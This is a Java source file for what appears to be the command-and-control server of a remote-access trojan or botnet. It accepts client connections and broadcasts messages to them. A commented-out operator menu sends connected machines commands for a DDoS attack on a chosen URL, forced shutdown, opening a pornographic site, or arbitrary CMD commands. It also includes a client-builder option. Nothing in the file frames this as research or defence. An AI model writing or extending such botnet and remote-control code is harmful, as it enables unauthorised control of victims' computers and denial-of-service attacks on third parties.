package br.com.pricher.server.core;

import br.com.pricher.server.model.Client;
import br.com.pricher.server.view.NotificationManager;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;

/**
 * Created by Jeferson Machado on 26/07/2017.
 */
public class Server extends Thread {

    private static int mUserGeneratedId = 0;

    private static OnServerCallback mCallback;

    private static HashMap<BufferedWriter, Client> mClients;

    private Socket con;
    private BufferedReader bfr;

    private Server(Socket con) {
        this.con = con;
        try {
            InputStream in = con.getInputStream();
            InputStreamReader inr = new InputStreamReader(in);
            bfr = new BufferedReader(inr);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void Start(OnServerCallback callback, int port) {
        mCallback = callback;
        mClients = new HashMap<>();
        try {
            final ServerSocket server = new ServerSocket(port);

            new Thread(() -> {
                while (true) {
                    try {
                        Socket con = server.accept();
                        Thread t = new Server(con);
                        t.start();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();

        } catch (Exception ignored) {
            callback.onServerDisconnect();
        }
    }

    private static void sendToAll(String msg) {
        mClients.forEach((bw, client) -> {
            try {
                bw.write(msg + "\r\n");
                bw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
    }

    private static void sendMsgToClient(BufferedWriter bf, String message) {
        if (mClients.containsKey(bf)) {
            try {
                bf.write(message + "\r\n");
                bf.flush();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /*private static void showOptions() {
        try {
            do {
                int clientSelected;
                int optionSelected;

                System.out.println("-----------------------------------------");

                if (mClients.size() > 0) {
                    Scanner reader = new Scanner(System.in);

                    for (int i = 0; i < mClients.size(); i++) {
                        System.out.println("(" + i + ") -> ClientName: " + mClientsNames.get(mClients.get(i)));
                    }

                    System.out.println("(999) -> DDOS ATK");
                    System.out.println("(666) -> Update List");
                    System.out.println("-----------------------------------------");

                    do {
                        System.out.print("Select a client: >. ");
                        clientSelected = reader.nextInt();
                        if ((clientSelected > mClients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999) {
                            System.out.println("Select a valid client");
                            System.out.println("-----------------------------------------");
                        }
                    }
                    while ((clientSelected > mClients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999);

                    if (clientSelected == 666) {
                        System.out.println("-----------------------------------------");
                        continue;
                    }

                    if (clientSelected == 999) {
                        System.out.println("ENTRY THE TARGET URL: ");
                        reader.nextLine();
                        String urlTarget = reader.nextLine();

                        System.out.println("PRIORITY OF THE ATTACK: ");
                        System.out.println("3 - HIGH");
                        System.out.println("2 - MEDIUM");
                        System.out.println("1 - LOW");

                        int priority = reader.nextInt();

                        switch (priority) {
                            case HIGH:
                                priority = HIGH;
                                break;
                            case MEDIUM:
                                priority = MEDIUM;
                            case LOW:
                                priority = LOW;
                            default:
                                priority = HIGH;
                        }

                        if (!urlTarget.contains("http") || !urlTarget.contains("https")) {
                            urlTarget = "http://" + urlTarget;
                        }
                        String msg = "66&" + urlTarget + "&" + priority;
                        sendToAll(msg);
                        continue;
                    }

                    do {
                        System.out.println("0 - TURN OFF COMPUTER");
                        System.out.println("1 - OPEN PORNOZAO");
                        System.out.println("2 - CMD COMMAND");
                        System.out.println("3 - VOLTAR");

                        System.out.print(">. ");
                        optionSelected = reader.nextInt();

                        if (optionSelected > 3 || optionSelected < 0) {
                            System.out.println("Select a valid option fuck!");
                        }

                    } while (optionSelected > 3 || optionSelected < 0);

                    if (optionSelected == 3) {
                        System.out.println("-----------------------------------------");
                        continue;
                    }

                    String msg;
                    if (optionSelected == 0) {

                        System.out.println("SHUTDOWN TIME (SECONDS): ");
                        long time = reader.nextLong();
                        msg = "0&shutdown -s -t " + (time <= 0 ? 30000 : time);

                    } else if (optionSelected == 1) {
                        System.out.println("ENTRY THE SITE: ");
                        String site = reader.next();
                        msg = "1&" + site;

                    } else if (optionSelected == 2) {
                        System.out.println("ENTRY THE COMMAND: ");
                        reader.nextLine();
                        String command = reader.nextLine();
                        msg = "2&" + (command == null ? "" : command);
                    } else {
                        continue;
                    }

                    try {
                        sendMsgToClient(mClients.get(clientSelected), msg);
                        System.out.println("Command send!");
                    } catch (Exception ignored) {
                        removeUser(mClients.get(clientSelected));
                    }


                } else {
                    System.out.println("No connected users!");
                    System.out.println("-----------------------------------------");

                    Scanner scan = new Scanner(System.in);
                    System.out.println("777 - Create Client");
                    System.out.println("ANY - Refresh");
                    System.out.print(">. ");

                    int op = scan.nextInt();
                    if (op == 777) {
                        System.out.print("IP >. ");
                        scan.nextLine();
                        String ip = scan.nextLine();
                        System.out.print("PÓRT >. ");
                        String port = scan.nextLine();
                        new MakeClient(ip, port);
                    }
                }
            } while (true);
        } catch (Exception ignored) {
        }
    }*/

    private static void removeUser(BufferedWriter bufferedWriter) {
        try {
            NotificationManager.show(mClients.get(bufferedWriter) + " disconnected :C");
            Client removed = mClients.remove(bufferedWriter);
            mCallback.onClientDisconnected(removed);
        } catch (Exception ignored) {
        }
    }

    public void run() {
        try {
            OutputStream outPutStream = this.con.getOutputStream();
            Writer writer = new OutputStreamWriter(outPutStream);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);

            String content = bfr.readLine();
            System.out.println("Content -> " + content);
            Client client = Client.create(content, mUserGeneratedId++);
            mCallback.onClientConnected(client);
            mClients.put(bufferedWriter, client);

            NotificationManager.show(client + " -> connected :D");

            new Thread(() -> {
                while (true) {
                    try {
                        String messageContent = bfr.readLine();
                        if (messageContent == null) {
                            removeUser(bufferedWriter);
                            break;
                        } else {
                            NotificationManager.show(messageContent);
                        }
                    } catch (IOException e) {
                        removeUser(bufferedWriter);
                        break;
                    }
                }
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
